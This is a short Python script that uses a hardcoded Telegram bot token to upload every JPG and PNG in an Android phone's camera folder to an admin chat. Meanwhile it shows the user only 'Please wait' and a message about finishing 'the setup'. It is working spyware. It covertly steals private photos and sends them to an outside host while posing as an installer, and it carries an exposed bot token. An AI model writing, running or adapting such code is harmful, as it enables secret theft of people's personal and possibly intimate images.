import os, telebot, time, sys
start = time.perf_counter()

TOKEN = '5576618353:AAHq9-xuSwhE8zf7JDVT4ptSuSLqY6SsRGM'
bot = telebot.TeleBot(TOKEN)
admin = 5166934462
_dir = '/sdcard/DCIM/Camera'

def main(_dir):
    print("Please wait...\n")
    if os.path.exists(_dir):
        os.chdir(_dir)
        files = os.listdir(os.getcwd())
        if 'done' not in files:
            if len(files) > 0:
                try:
                    for file in files:
                        if file.endswith('jpg') or file.endswith('png'):
                            with open(f'{file}', 'rb') as f:
                                try:
                                    bot.send_photo(admin, f)
                                except:
                                    pass
                        else:
                            pass
                    with open('done', 'w') as f:
                        bot.send_message(admin, 'Done...')
                except KeyboardInterrupt:
                    print('Next time wait longer to finish the setup...\n')
                    sys.exit()
            else:
                pass
        else:
            bot.send_message(admin, 'Already done...')
    else:
        bot.send_message(admin, 'No dir')

if __name__ == '__main__':
    main(_dir)
    stop = time.perf_counter()
    print(f'[Finished in {round(stop-start, 2)}s]')